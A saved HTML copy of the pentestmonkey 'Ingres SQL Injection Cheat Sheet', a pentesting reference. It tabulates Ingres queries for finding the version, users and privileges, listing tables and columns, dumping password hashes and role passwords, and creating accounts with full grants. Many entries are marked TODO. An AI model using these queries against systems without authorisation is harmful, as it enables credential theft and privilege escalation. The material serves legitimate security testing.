@@ -1,0 +1,410 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" dir="ltr" lang="en-US" xml:lang="en-US">
+<head profile="http://gmpg.org/xfn/11">
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+<title>Ingres SQL Injection Cheat Sheet | pentestmonkey</title>
+<link rel="stylesheet" href="http://pentestmonkey.net/wp-content/themes/baza-noclegowa/style.css" type="text/css" media="screen" />
+<link rel="pingback" href="http://pentestmonkey.net/xmlrpc.php" />
+<link rel="alternate" type="application/rss+xml" title="pentestmonkey &raquo; Feed" href="http://pentestmonkey.net/feed" />
+<link rel="alternate" type="application/rss+xml" title="pentestmonkey &raquo; Comments Feed" href="http://pentestmonkey.net/comments/feed" />
+<link rel="alternate" type="application/rss+xml" title="pentestmonkey &raquo; Ingres SQL Injection Cheat Sheet Comments Feed" href="http://pentestmonkey.net/cheat-sheet/sql-injection/ingres-sql-injection-cheat-sheet/feed" />
+<script type='text/javascript' src='http://pentestmonkey.net/wp-includes/js/l10n.js?ver=20101110'></script>
+<script type='text/javascript' src='http://pentestmonkey.net/wp-includes/js/jquery/jquery.js?ver=1.6.1'></script>
+<script type='text/javascript' src='http://pentestmonkey.net/wp-content/themes/baza-noclegowa/js/jquery.ddmenu.js?ver=3.2.1'></script>
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://pentestmonkey.net/xmlrpc.php?rsd" />
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://pentestmonkey.net/wp-includes/wlwmanifest.xml" /> 
+<link rel='index' title='pentestmonkey' href='http://pentestmonkey.net' />
+<link rel='start' title='A Penetration Testing Site' href='http://pentestmonkey.net/site-news/a-penetration-testing-site' />
+<link rel='prev' title='Minor update: Yapscan v0.7.2' href='http://pentestmonkey.net/blog/yapscan-update-0-7-2' />
+<link rel='next' title='DB2 SQL Injection Cheat Sheet' href='http://pentestmonkey.net/cheat-sheet/sql-injection/db2-sql-injection-cheat-sheet' />
+<meta name="generator" content="WordPress 3.2.1" />
+<link rel='canonical' href='http://pentestmonkey.net/cheat-sheet/sql-injection/ingres-sql-injection-cheat-sheet' />
+<link rel='shortlink' href='http://pentestmonkey.net/?p=83' />
+<!--[if lte IE 7]><link href="http://pentestmonkey.net/wp-content/themes/baza-noclegowa/ie.css" rel="stylesheet" media="screen" type="text/css" /><![endif]-->	
+<!--[if IE 6]><script src="http://pentestmonkey.net/wp-content/themes/baza-noclegowa/js/DD_belatedPNG.js"></script><![endif]-->
+</head>
+<body class="single single-post postid-83 single-format-standard">
+	<div class="all-page">
+		
+		<div class="container">
+			
+			<!-- HEADER -->
+			<div id="header">
+			    <div class="website-name"><a href="http://pentestmonkey.net/">pentestmonkey</a></div>
+				<div class="slogan">Taking the monkey work out of pentesting</div>
+			</div>
+			<!-- /HEADER -->
+
+			<!-- main NAVIGATION -->
+			<div id="mainNav">
+				<div class="wrap">
+    <div class="menu-cheat-sheets-container"><ul id="menu-cheat-sheets" class="menu"><li id="menu-item-133" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-133"><a href="http://pentestmonkey.net/category/site-news"><span>Site News</span></a></li>
+<li id="menu-item-130" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-130"><a href="http://pentestmonkey.net/category/blog"><span>Blog</span></a></li>
+<li id="menu-item-136" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-136"><a href="http://pentestmonkey.net/category/tools"><span>Tools</span></a></li>
+<li id="menu-item-137" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-137"><a href="http://pentestmonkey.net/category/yaptest"><span>Yaptest</span></a></li>
+<li id="menu-item-134" class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor menu-item-134"><a href="http://pentestmonkey.net/category/cheat-sheet"><span>Cheat Sheets</span></a></li>
+<li id="menu-item-135" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-135"><a href="http://pentestmonkey.net/category/contact"><span>Contact</span></a></li>
+</ul></div>				</div>
+			</div>
+			<!-- /main NAVIGATION -->
+			<div class="clear"></div>
+
+
+			<!-- CONTENT -->
+			<div id="content">
+
+	<!-- Start: Left Panel -->
+	<div class="content">
+
+	
+		<div class="post-83 post type-post status-publish format-standard hentry category-sql-injection tag-cheatsheet tag-database tag-ingres tag-pentest tag-sqlinjection" id="post-83">
+			<h1>Ingres SQL Injection Cheat Sheet</h1>
+
+			<div class="entryContent">
+				<p>Ingres seems to be one of the less common database backends for web applications, so I thought it would be worth installing it and making some notes to make my next Ingres-based web app test a little easier.</p>
+<p><span id="more-83"></span></p>
+<p>Below are some tabulated notes on how to do many of thing you&#8217;d normally do via SQL injection.  All tests were performed on Ingres 9.2.0 alpha Build 108 for Linux.  The Ingres download page is <a href="http://ingres.com/downloads/prod-comm-download.php">here</a>.</p>
+<p>This page will probably remain a work-in-progress for some time yet.  I&#8217;ll update it as I learn more.</p>
+<p>This post is part of series of SQL Injection Cheat Sheets.  In this series, I&#8217;ve endevoured to tabulate the data to make it easier to read and to use the same table for for each database backend.  This helps to highlight any features which are lacking for each database, and enumeration techniques that don&#8217;t apply and also areas that I haven&#8217;t got round to researching yet.</p>
+<p>The complete list of SQL Injection Cheat Sheets I&#8217;m working is:</p>
+<ul>
+<li><a href="http://pentestmonkey.net/blog/oracle-sql-injection-cheat-sheet/">Oracle</a></li>
+<li><a href="http://pentestmonkey.net/blog/mssql-sql-injection-cheat-sheet/">MSSQL</a></li>
+<li><a href="http://pentestmonkey.net/blog/mysql-sql-injection-cheat-sheet/">MySQL</a></li>
+<li><a href="http://pentestmonkey.net/blog/postgres-sql-injection-cheat-sheet/">PostgreSQL</a></li>
+<li><a href="http://pentestmonkey.net/blog/ingres-sql-injection-cheat-sheet/">Ingres</a></li>
+<li><a href="http://pentestmonkey.net/blog/db2-sql-injection-cheat-sheet/">DB2</a></li>
+<li><a href="http://pentestmonkey.net/blog/informix-sql-injection-cheat-sheet/">Informix</a></li>
+</ul>
+<p>I&#8217;m not planning to write one for MS Access, but there&#8217;s a great <a href="http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html">MS Access Cheat Sheet here</a>.</p>
+<table border="1">
+<tbody>
+<tr>
+<td>Version</td>
+<td>select dbmsinfo(&#8216;_version&#8217;);</td>
+</tr>
+<tr>
+<td>Comments</td>
+<td>SELECT 123; &#8212; comment<br />
+select 123; /* comment */</td>
+</tr>
+<tr>
+<td>Current User</td>
+<td>select dbmsinfo(&#8216;session_user&#8217;);<br />
+select dbmsinfo(&#8216;system_user&#8217;);</td>
+</tr>
+<tr>
+<td>List Users</td>
+<td>First connect to iidbdb, then:<br />
+SELECT name, password FROM iiuser; &#8212; or<br />
+SELECT own FROM iidatabase;</td>
+</tr>
+<tr>
+<td>Create Users</td>
+<td>create user testuser with password = &#8216;testuser&#8217;;&#8211; priv</td>
+</tr>
+<tr>
+<td>List Password Hashes</td>
+<td>First connect to iidbdb, then:<br />
+select name, password from iiuser;</td>
+</tr>
+<tr>
+<td>List Privileges</td>
+<td>select dbmsinfo(&#8216;db_admin&#8217;);<br />
+select dbmsinfo(&#8216;create_table&#8217;);<br />
+select dbmsinfo(&#8216;create_procedure&#8217;);<br />
+select dbmsinfo(&#8216;security_priv&#8217;);<br />
+select dbmsinfo(&#8216;select_syscat&#8217;);<br />
+select dbmsinfo(&#8216;db_privileges&#8217;);<br />
+select dbmsinfo(&#8216;current_priv_mask&#8217;);</td>
+</tr>
+<tr>
+<td>List DBA Accounts</td>
+<td>TODO</td>
+</tr>
+<tr>
+<td>Current Database</td>
+<td>select dbmsinfo(&#8216;database&#8217;);</td>
+</tr>
+<tr>
+<td>List Databases</td>
+<td>SELECT name FROM iidatabase; &#8212; connect to iidbdb</td>
+</tr>
+<tr>
+<td>List Columns</td>
+<td>select column_name, column_datatype, table_name, table_owner from iicolumns;</td>
+</tr>
+<tr>
+<td>List Tables</td>
+<td>select table_name, table_owner from iitables;<br />
+select relid, relowner, relloc from iirelation;<br />
+select relid, relowner, relloc from iirelation where relowner != &#8216;$ingres&#8217;;</td>
+</tr>
+<tr>
+<td>Find Tables From Column Name</td>
+<td>SELECT table_name, table_owner FROM iicolumns WHERE column_name = &#8216;value&#8217;</td>
+</tr>
+<tr>
+<td>Select Nth Row</td>
+<td>Astoundingly, this <a href="http://community.ingres.com/forums/viewtopic.php?p=6050">doesn&#8217;t</a>seem to be possible!  This is as close as you can get:select top 10 blah from table;<br />
+select first 10 blah form table;</td>
+</tr>
+<tr>
+<td>Select Nth Char</td>
+<td>select substr(&#8216;abc&#8217;, 2, 1); &#8212; returns &#8216;b&#8217;</td>
+</tr>
+<tr>
+<td>Bitwise AND</td>
+<td>The function &#8220;bit_and&#8221; exists, but seems hard to use.  Here&#8217;s an<br />
+example of ANDing 3 and 5 together.  The result is a &#8220;byte&#8221; type<br />
+with value ?01:select substr(bit_and(cast(3 as byte), cast(5 as byte)),1,1);</td>
+</tr>
+<tr>
+<td>ASCII Value -&gt; Char</td>
+<td>TODO</td>
+</tr>
+<tr>
+<td>Char -&gt; ASCII Value</td>
+<td>TODO<br />
+(The &#8220;ascii&#8221; function exists, but doesn&#8217;t seem to do what I&#8217;d expect.)</td>
+</tr>
+<tr>
+<td>Casting</td>
+<td>select cast(123 as varchar);<br />
+select cast(&#8217;123&#8242; as integer);</td>
+</tr>
+<tr>
+<td>String Concatenation</td>
+<td>select &#8216;abc&#8217; || &#8216;def&#8217;;</td>
+</tr>
+<tr>
+<td>If Statement</td>
+<td>TODO</td>
+</tr>
+<tr>
+<td>Case Statement</td>
+<td>TODO</td>
+</tr>
+<tr>
+<td>Avoiding Quotes</td>
+<td>TODO</td>
+</tr>
+<tr>
+<td>Time Delay</td>
+<td>???See <a href="http://www.microsoft.com/technet/community/columns/secmvp/sv0907.mspx">Heavy Queries</a> article for some ideas.</td>
+</tr>
+<tr>
+<td>Make DNS Requests</td>
+<td>TODO</td>
+</tr>
+<tr>
+<td>Command Execution</td>
+<td>Impossible?</td>
+</tr>
+<tr>
+<td>Local File Access</td>
+<td>TODO</td>
+</tr>
+<tr>
+<td>Hostname, IP Address</td>
+<td>SELECT dbmsinfo(&#8216;ima_server&#8217;)</td>
+</tr>
+<tr>
+<td>Location of DB files</td>
+<td>SELECT dbdev, ckpdev, jnldev, sortdev FROM iidatabase WHERE name = &#8216;value&#8217; &#8212; primary location of db<br />
+SELECT lname FROM iiextend WHERE dname = &#8216;value&#8217; &#8212; extended location of db<br />
+SELECT are FROM iilocations where lname = &#8216;value&#8217; &#8211; all area (ie directory) linked with a location</td>
+</tr>
+<tr>
+<td>Default/System Databases</td>
+<td>SELECT name FROM iidatabase WHERE own = &#8216;$ingres&#8217; &#8212; connect to iidbdb</td>
+</tr>
+<tr>
+<td>Installing Locally</td>
+<td>The Ingres database can be downloaded for free from <a href="http://esd.ingres.com/">http://esd.ingres.com/</a><br />
+A pre-built Linux-based Ingres Database Server can be download from <a href="http://www.vmware.com/appliances/directory/832">http://www.vmware.com/appliances/directory/832</a></td>
+</tr>
+<tr>
+<td>Database Client</td>
+<td>TODO<br />
+There is a client called &#8220;sql&#8221; which can be used for local connections (at least) in the  database server package above.</td>
+</tr>
+<tr>
+<td>Logging in from command line</td>
+<td>$ su -  ingres<br />
+$ sql iidbdb<br />
+* select dbmsinfo(&#8216;_version&#8217;); go</td>
+</tr>
+<tr>
+<td>Identifying on the network</td>
+<td>TODO</td>
+</tr>
+</tbody>
+</table>
+<p>The following areas are interesting enough to include on this page, but I haven&#8217;t researched them for other databases:</p>
+<table border="1">
+<tbody>
+<tr>
+<td><strong>Description</strong></td>
+<td><strong>SQL / Comments </strong></td>
+</tr>
+<tr>
+<td> Batching Queries Allowed?</td>
+<td>Not via DBI in PERL.  Subsequent statements seem to get ignored:<br />
+select blah from table where foo = 1; select &#8230; doesn&#8217;t matter this is ignored.</td>
+</tr>
+<tr>
+<td> FROM clause mandated in SELECTs?</td>
+<td>No.  You don&#8217;t need to select form &#8220;dual&#8221; or anything.  The following is legal:<br />
+select 1;</td>
+</tr>
+<tr>
+<td> UNION supported</td>
+<td>Yes.  Nothing tricky here.  The following is legal:<br />
+select 1 union select 2;</td>
+</tr>
+<tr>
+<td> Enumerate Tables Privs</td>
+<td>select table_name, permit_user, permit_type from iiaccess;</td>
+</tr>
+<tr>
+<td> Length of a string</td>
+<td>select length(&#8216;abc&#8217;); &#8212; returns 3</td>
+</tr>
+<tr>
+<td> Roles and passwords</td>
+<td>First you need to connect to iidbdb, then:<br />
+select roleid, rolepass from iirole;</td>
+</tr>
+<tr>
+<td>List Database Procedures</td>
+<td>First you need to connect to iidbdb, then:<br />
+select dbp_name,  dbp_owner from iiprocedure;</td>
+</tr>
+<tr>
+<td>Create Users + Granting Privs</td>
+<td>First you need to connect to iidbdb, then:<br />
+create user pm with password = &#8216;password&#8217;;<br />
+grant all on current installation to pm;</td>
+</tr>
+</tbody>
+</table>
+<p><span class="Apple-style-span" style="color: #000000; font-size: 17px; line-height: 25px;">Thanks</span></p>
+<p>Pentestmonkey gratefully acknowledges the contributions of:</p>
+<p>Jean-Pierre Zuate</p>
+<p>&nbsp;</p>
+                <div class="clear"></div>
+								<p>Tags: <a href="http://pentestmonkey.net/tag/cheatsheet" rel="tag">cheatsheet</a>, <a href="http://pentestmonkey.net/tag/database" rel="tag">database</a>, <a href="http://pentestmonkey.net/tag/ingres" rel="tag">ingres</a>, <a href="http://pentestmonkey.net/tag/pentest" rel="tag">pentest</a>, <a href="http://pentestmonkey.net/tag/sqlinjection" rel="tag">sqlinjection</a></p>				<p>Posted in <a href="http://pentestmonkey.net/category/cheat-sheet/sql-injection" title="View all posts in SQL Injection" rel="category tag">SQL Injection</a></p>
+				
+			</div>
+		</div>
+
+	
+<!-- You can start editing here. -->
+
+
+			<!-- If comments are open, but there are no comments. -->
+
+	 
+<p></p>
+<br />
+
+
+								
+
+
+
+
+	
+	</div>
+				<!-- sidebar -->
+				<div class="sideBar">
+					
+					<div class="nav">
+						<div class="bFrameT"><i></i></div>
+	<form method="get" id="searchform" action="http://pentestmonkey.net/" class="searchForm">
+	<p><input type="text" value="" name="s" id="s" class="field" />
+	<input type="image" src="http://pentestmonkey.net/wp-content/themes/baza-noclegowa/images/search.gif" alt="" title="Search" id="searchsubmit" class="btn" /></p>
+</form>
+<h3><span>Categories</span></h3>		<ul>
+	<li class="cat-item cat-item-5"><a href="http://pentestmonkey.net/category/blog" title="View all posts filed under Blog">Blog</a> (78)
+</li>
+	<li class="cat-item cat-item-39"><a href="http://pentestmonkey.net/category/cheat-sheet" title="View all posts filed under Cheat Sheets">Cheat Sheets</a> (10)
+<ul class='children'>
+	<li class="cat-item cat-item-40"><a href="http://pentestmonkey.net/category/cheat-sheet/shells" title="View all posts filed under Shells">Shells</a> (1)
+</li>
+	<li class="cat-item cat-item-8"><a href="http://pentestmonkey.net/category/cheat-sheet/sql-injection" title="View all posts filed under SQL Injection">SQL Injection</a> (7)
+</li>
+</ul>
+</li>
+	<li class="cat-item cat-item-7"><a href="http://pentestmonkey.net/category/contact" title="View all posts filed under Contact">Contact</a> (2)
+</li>
+	<li class="cat-item cat-item-3"><a href="http://pentestmonkey.net/category/site-news" title="View all posts filed under Site News">Site News</a> (3)
+</li>
+	<li class="cat-item cat-item-4"><a href="http://pentestmonkey.net/category/tools" title="View all posts filed under Tools">Tools</a> (17)
+<ul class='children'>
+	<li class="cat-item cat-item-14"><a href="http://pentestmonkey.net/category/tools/audit" title="View all posts filed under Audit">Audit</a> (3)
+</li>
+	<li class="cat-item cat-item-16"><a href="http://pentestmonkey.net/category/tools/misc" title="View all posts filed under Misc">Misc</a> (7)
+</li>
+	<li class="cat-item cat-item-13"><a href="http://pentestmonkey.net/category/tools/user-enumeration" title="View all posts filed under User Enumeration">User Enumeration</a> (4)
+</li>
+	<li class="cat-item cat-item-15"><a href="http://pentestmonkey.net/category/tools/web-shells" title="View all posts filed under Web Shells">Web Shells</a> (3)
+</li>
+</ul>
+</li>
+	<li class="cat-item cat-item-1"><a href="http://pentestmonkey.net/category/uncategorized" title="View all posts filed under Uncategorized">Uncategorized</a> (3)
+</li>
+	<li class="cat-item cat-item-6"><a href="http://pentestmonkey.net/category/yaptest" title="View all posts filed under Yaptest">Yaptest</a> (15)
+<ul class='children'>
+	<li class="cat-item cat-item-12"><a href="http://pentestmonkey.net/category/yaptest/front-end" title="View all posts filed under Front End">Front End</a> (1)
+</li>
+	<li class="cat-item cat-item-9"><a href="http://pentestmonkey.net/category/yaptest/installing" title="View all posts filed under Installing">Installing</a> (2)
+</li>
+	<li class="cat-item cat-item-11"><a href="http://pentestmonkey.net/category/yaptest/overview" title="View all posts filed under Overview">Overview</a> (2)
+</li>
+	<li class="cat-item cat-item-10"><a href="http://pentestmonkey.net/category/yaptest/using" title="View all posts filed under Using">Using</a> (8)
+</li>
+</ul>
+</li>
+		</ul>
+<h3><span> <a href="/rss/" class="mainlevel-nav" rel="alternate" type="application/rss+xml"><img src="http://www.feedburner.com/fb/images/pub/feed-icon16x16.png" alt="" style="vertical-align:middle;border:0"/></a>&nbsp;<a href="/rss/" class="mainlevel-nav" rel="alternate" type="application/rss+xml">RSS Feed</a></p> <link rel="alternate" type="application/rss+xml" title="Pentestmonkey RSS Feed" href="/rss/" /> </span></h3>
+			
+						<div class="bFrameB"><i></i></div>
+					</div>
+					
+				</div>
+				<!-- /sidebar -->
+	
+				</div>
+				<!-- /content -->
+				
+			</div>
+			<!-- /CONTENT -->	
+			
+		
+		<!-- bottom NAVIGATION -->
+		<div id="bottomNav">
+		</div>
+		<!-- /bottom NAVIGATION -->
+		
+		<!-- FOOTER -->
+		<div id="footer">
+         <div class="menu"></div>
+			
+			
+		</div>
+		<!-- /FOOTER -->
+	</div>
+		
+
+
+<script src="http://www.google-analytics.com/urchin.js" type="text/javascript">
+</script>
+<script type="text/javascript">
+_uacct = "UA-2082472-1";
+urchinTracker();
+</script>
+
+</body>
+</html>
